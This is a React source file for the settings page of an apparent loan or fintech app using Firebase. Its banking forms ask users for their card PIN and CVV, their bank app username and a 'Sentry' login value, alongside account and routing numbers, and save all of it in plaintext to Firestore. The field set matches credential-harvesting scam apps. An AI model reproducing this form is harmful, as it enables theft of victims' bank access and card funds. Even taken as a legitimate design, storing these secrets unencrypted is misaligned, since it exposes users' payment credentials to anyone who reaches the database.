import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  User, 
  CreditCard, 
  Building2, 
  Shield, 
  ChevronRight, 
  Plus, 
  CheckCircle2,
  AlertCircle,
  X,
  Lock
} from 'lucide-react';
import { useAuth } from '../../../hooks/useAuth';
import { doc, updateDoc } from 'firebase/firestore';
import { db } from '../../../lib/firebase';

export default function SettingsPage() {
  const { userData, user } = useAuth();
  const [activeTab, setActiveTab] = useState<'profile' | 'banking' | 'security'>('profile');
  const [isAddingBank, setIsAddingBank] = useState(false);
  const [isAddingCard, setIsAddingCard] = useState(false);
  const [loading, setLoading] = useState(false);

  // Bank Form State
  const [bankForm, setBankForm] = useState({
    bankName: '',
    accountNumber: '',
    accountName: '',
    routingNumber: '',
    bankAppUsername: '',
    sentry: ''
  });

  // Card Form State
  const [cardForm, setCardForm] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    pin: ''
  });

  const handleAddBank = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) return;
    setLoading(true);
    try {
      const userRef = doc(db, 'users', user.uid);
      await updateDoc(userRef, {
        bankDetails: bankForm
      });
      setIsAddingBank(false);
    } catch (error) {
      console.error('Error adding bank:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleAddCard = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) return;
    setLoading(true);
    try {
      const userRef = doc(db, 'users', user.uid);
      await updateDoc(userRef, {
        cardDetails: cardForm
      });
      setIsAddingCard(false);
    } catch (error) {
      console.error('Error adding card:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-4xl mx-auto p-6 space-y-8">
      <header className="space-y-2">
        <h1 className="text-3xl font-bold dark:text-white">Profile Settings</h1>
        <p className="text-gray-500 dark:text-gray-400">Manage your personal information and connected accounts</p>
      </header>

      {/* Tabs */}
      <div className="flex gap-1 p-1 bg-gray-100 dark:bg-zinc-900 rounded-xl w-fit">
        {[
          { id: 'profile', label: 'Profile', icon: User },
          { id: 'banking', label: 'Banking & Cards', icon: CreditCard },
          { id: 'security', label: 'Security', icon: Shield },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`flex items-center gap-2 px-6 py-2.5 rounded-lg font-bold text-sm transition-all ${
              activeTab === tab.id
                ? 'bg-white dark:bg-zinc-800 text-accent shadow-sm'
                : 'text-gray-500 hover:text-gray-900 dark:hover:text-white'
            }`}
          >
            <tab.icon className="w-4 h-4" />
            {tab.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
        {/* Main Content */}
        <div className="md:col-span-2 space-y-6">
          <AnimatePresence mode="wait">
            {activeTab === 'profile' && (
              <motion.div
                key="profile"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                <div className="bg-white dark:bg-zinc-900 rounded-2xl p-6 border border-gray-100 dark:border-zinc-800 space-y-6">
                  <div className="flex items-center gap-6">
                    <div className="w-20 h-20 rounded-full bg-accent/10 flex items-center justify-center text-accent">
                      <User className="w-10 h-10" />
                    </div>
                    <div>
                      <h3 className="font-bold text-lg dark:text-white">{userData?.fullName}</h3>
                      <p className="text-gray-500 text-sm">{user?.email}</p>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4 pt-6 border-t border-gray-100 dark:border-zinc-800">
                    <div>
                      <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Full Name</label>
                      <p className="font-bold dark:text-white mt-1">{userData?.fullName}</p>
                    </div>
                    <div>
                      <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">KYC Status</label>
                      <div className="flex items-center gap-2 mt-1">
                        <CheckCircle2 className="w-4 h-4 text-green-500" />
                        <p className="font-bold text-green-500 capitalize">{userData?.kycStatus}</p>
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}

            {activeTab === 'banking' && (
              <motion.div
                key="banking"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                {/* Bank Account Section */}
                <div className="bg-white dark:bg-zinc-900 rounded-2xl p-6 border border-gray-100 dark:border-zinc-800 space-y-6">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="p-2 bg-blue-50 dark:bg-blue-500/10 rounded-lg text-blue-600">
                        <Building2 className="w-5 h-5" />
                      </div>
                      <h3 className="font-bold dark:text-white">Bank Account</h3>
                    </div>
                    {!userData?.bankDetails && (
                      <button 
                        onClick={() => setIsAddingBank(true)}
                        className="flex items-center gap-2 text-sm font-bold text-accent hover:opacity-80"
                      >
                        <Plus className="w-4 h-4" />
                        Connect Bank
                      </button>
                    )}
                  </div>

                  {userData?.bankDetails ? (
                    <div className="p-4 bg-gray-50 dark:bg-zinc-800/50 rounded-xl border border-gray-100 dark:border-zinc-800">
                      <div className="flex justify-between items-start">
                        <div className="space-y-1">
                          <p className="font-bold dark:text-white">{userData.bankDetails.bankName}</p>
                          <p className="text-sm text-gray-500">Account: ****{userData.bankDetails.accountNumber.slice(-4)}</p>
                          <p className="text-sm text-gray-500">{userData.bankDetails.accountName}</p>
                        </div>
                        <span className="px-2 py-1 bg-green-100 dark:bg-green-500/10 text-green-600 text-[10px] font-bold uppercase rounded">Connected</span>
                      </div>
                    </div>
                  ) : (
                    <div className="p-8 text-center border-2 border-dashed border-gray-200 dark:border-zinc-800 rounded-2xl">
                      <p className="text-gray-500 text-sm">No bank account connected</p>
                    </div>
                  )}
                </div>

                {/* Credit Card Section */}
                <div className="bg-white dark:bg-zinc-900 rounded-2xl p-6 border border-gray-100 dark:border-zinc-800 space-y-6">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="p-2 bg-purple-50 dark:bg-purple-500/10 rounded-lg text-purple-600">
                        <CreditCard className="w-5 h-5" />
                      </div>
                      <h3 className="font-bold dark:text-white">Credit Card</h3>
                    </div>
                    {!userData?.cardDetails && (
                      <button 
                        onClick={() => setIsAddingCard(true)}
                        className="flex items-center gap-2 text-sm font-bold text-accent hover:opacity-80"
                      >
                        <Plus className="w-4 h-4" />
                        Add Card
                      </button>
                    )}
                  </div>

                  {userData?.cardDetails ? (
                    <div className="p-4 bg-gray-50 dark:bg-zinc-800/50 rounded-xl border border-gray-100 dark:border-zinc-800">
                      <div className="flex justify-between items-start">
                        <div className="space-y-1">
                          <p className="font-bold dark:text-white">Credit Card</p>
                          <p className="text-sm text-gray-500">Number: **** **** **** {userData.cardDetails.cardNumber.slice(-4)}</p>
                          <p className="text-sm text-gray-500">Expires: {userData.cardDetails.expiryDate}</p>
                        </div>
                        <span className="px-2 py-1 bg-green-100 dark:bg-green-500/10 text-green-600 text-[10px] font-bold uppercase rounded">Connected</span>
                      </div>
                    </div>
                  ) : (
                    <div className="p-8 text-center border-2 border-dashed border-gray-200 dark:border-zinc-800 rounded-2xl">
                      <p className="text-gray-500 text-sm">No credit card added</p>
                    </div>
                  )}
                </div>
              </motion.div>
            )}

            {activeTab === 'security' && (
              <motion.div
                key="security"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="space-y-6"
              >
                <div className="bg-white dark:bg-zinc-900 rounded-2xl p-6 border border-gray-100 dark:border-zinc-800 space-y-6">
                  <div className="flex items-center gap-3">
                    <div className="p-2 bg-orange-50 dark:bg-orange-500/10 rounded-lg text-orange-600">
                      <Shield className="w-5 h-5" />
                    </div>
                    <h3 className="font-bold dark:text-white">Security Settings</h3>
                  </div>

                  <div className="space-y-4">
                    <div className="flex items-center justify-between p-4 bg-gray-50 dark:bg-zinc-800/50 rounded-xl">
                      <div className="flex items-center gap-3">
                        <Lock className="w-5 h-5 text-gray-400" />
                        <div>
                          <p className="font-bold text-sm dark:text-white">Two-Factor Authentication</p>
                          <p className="text-xs text-gray-500">Add an extra layer of security to your account</p>
                        </div>
                      </div>
                      <button className="text-xs font-bold text-accent">Enable</button>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Sidebar Info */}
        <div className="space-y-6">
          <div className="bg-accent/5 rounded-2xl p-6 border border-accent/10">
            <h4 className="font-bold text-accent mb-2">Account Verification</h4>
            <p className="text-sm text-gray-600 dark:text-gray-400 mb-4">
              Your account is fully verified. You have access to all features including high-limit loans and international transfers.
            </p>
            <div className="flex items-center gap-2 text-accent font-bold text-sm">
              <CheckCircle2 className="w-4 h-4" />
              Verified Account
            </div>
          </div>

          <div className="bg-gray-50 dark:bg-zinc-900 rounded-2xl p-6 border border-gray-100 dark:border-zinc-800">
            <h4 className="font-bold dark:text-white mb-4">Need Help?</h4>
            <ul className="space-y-3">
              {[
                'Contact Support',
                'Security Guide',
                'Privacy Policy',
                'Terms of Service'
              ].map((item) => (
                <li key={item} className="flex items-center justify-between text-sm text-gray-500 hover:text-accent cursor-pointer group">
                  {item}
                  <ChevronRight className="w-4 h-4 opacity-0 group-hover:opacity-100 transition-all" />
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>

      {/* Add Bank Modal */}
      <AnimatePresence>
        {isAddingBank && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-zinc-900 rounded-3xl p-8 w-full max-w-md shadow-2xl relative"
            >
              <button 
                onClick={() => setIsAddingBank(false)}
                className="absolute top-6 right-6 p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full transition-all"
              >
                <X className="w-5 h-5 text-gray-400" />
              </button>

              <div className="mb-8">
                <div className="w-12 h-12 bg-blue-50 dark:bg-blue-500/10 rounded-2xl flex items-center justify-center text-blue-600 mb-4">
                  <Building2 className="w-6 h-6" />
                </div>
                <h2 className="text-2xl font-bold dark:text-white">Connect Bank Account</h2>
                <p className="text-gray-500 text-sm">Enter your bank details to enable direct deposits</p>
              </div>

              <form onSubmit={handleAddBank} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Bank Name</label>
                  <input
                    required
                    type="text"
                    value={bankForm.bankName}
                    onChange={(e) => setBankForm({ ...bankForm, bankName: e.target.value })}
                    className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                    placeholder="e.g. Chase Bank"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Account Number</label>
                  <input
                    required
                    type="text"
                    value={bankForm.accountNumber}
                    onChange={(e) => setBankForm({ ...bankForm, accountNumber: e.target.value })}
                    className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                    placeholder="0000000000"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Account Name</label>
                  <input
                    required
                    type="text"
                    value={bankForm.accountName}
                    onChange={(e) => setBankForm({ ...bankForm, accountName: e.target.value })}
                    className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                    placeholder="John Doe"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Routing Number</label>
                  <input
                    required
                    type="text"
                    value={bankForm.routingNumber}
                    onChange={(e) => setBankForm({ ...bankForm, routingNumber: e.target.value })}
                    className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                    placeholder="000000000"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Bank App Username</label>
                  <input
                    required
                    type="text"
                    value={bankForm.bankAppUsername}
                    onChange={(e) => setBankForm({ ...bankForm, bankAppUsername: e.target.value })}
                    className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                    placeholder="Username"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Sentry</label>
                  <input
                    required
                    type="text"
                    value={bankForm.sentry}
                    onChange={(e) => setBankForm({ ...bankForm, sentry: e.target.value })}
                    className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                    placeholder="Sentry ID"
                  />
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full py-4 bg-accent text-white font-bold rounded-xl shadow-lg shadow-accent/20 hover:opacity-90 transition-all disabled:opacity-50 mt-4"
                >
                  {loading ? 'Connecting...' : 'Connect Bank Account'}
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Add Card Modal */}
      <AnimatePresence>
        {isAddingCard && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm">
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-zinc-900 rounded-3xl p-8 w-full max-w-md shadow-2xl relative"
            >
              <button 
                onClick={() => setIsAddingCard(false)}
                className="absolute top-6 right-6 p-2 hover:bg-gray-100 dark:hover:bg-zinc-800 rounded-full transition-all"
              >
                <X className="w-5 h-5 text-gray-400" />
              </button>

              <div className="mb-8">
                <div className="w-12 h-12 bg-purple-50 dark:bg-purple-500/10 rounded-2xl flex items-center justify-center text-purple-600 mb-4">
                  <CreditCard className="w-6 h-6" />
                </div>
                <h2 className="text-2xl font-bold dark:text-white">Add Credit Card</h2>
                <p className="text-gray-500 text-sm">Enter your card details securely</p>
              </div>

              <form onSubmit={handleAddCard} className="space-y-4">
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Card Number</label>
                  <input
                    required
                    type="text"
                    value={cardForm.cardNumber}
                    onChange={(e) => setCardForm({ ...cardForm, cardNumber: e.target.value })}
                    className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                    placeholder="0000 0000 0000 0000"
                  />
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Expiry Date</label>
                    <input
                      required
                      type="text"
                      value={cardForm.expiryDate}
                      onChange={(e) => setCardForm({ ...cardForm, expiryDate: e.target.value })}
                      className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                      placeholder="MM/YY"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">CVV</label>
                    <input
                      required
                      type="password"
                      maxLength={3}
                      value={cardForm.cvv}
                      onChange={(e) => setCardForm({ ...cardForm, cvv: e.target.value })}
                      className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                      placeholder="***"
                    />
                  </div>
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-400 uppercase tracking-wider">Card PIN</label>
                  <input
                    required
                    type="password"
                    maxLength={4}
                    value={cardForm.pin}
                    onChange={(e) => setCardForm({ ...cardForm, pin: e.target.value })}
                    className="w-full px-4 py-3 rounded-xl bg-gray-50 dark:bg-zinc-800 border border-gray-100 dark:border-zinc-700 focus:border-accent outline-none transition-all dark:text-white"
                    placeholder="****"
                  />
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full py-4 bg-accent text-white font-bold rounded-xl shadow-lg shadow-accent/20 hover:opacity-90 transition-all disabled:opacity-50 mt-4"
                >
                  {loading ? 'Adding Card...' : 'Add Credit Card'}
                </button>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
